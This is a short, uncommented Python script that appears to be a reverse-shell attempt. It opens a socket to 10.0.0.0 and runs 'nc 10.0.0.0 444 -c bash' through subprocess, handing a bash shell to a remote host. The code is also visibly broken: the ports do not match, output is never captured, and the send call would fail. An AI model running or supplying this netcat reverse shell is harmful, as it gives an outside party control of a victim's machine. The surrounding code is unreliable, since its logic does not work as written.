import socket
import subprocess

ip = ("10.0.0.0",4444)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(ip)

ki = subprocess.Popen("nc 10.0.0.0 444 -c bash", shell=True)
lo = ki.stdout
s.send(lo.encode())
s.close()
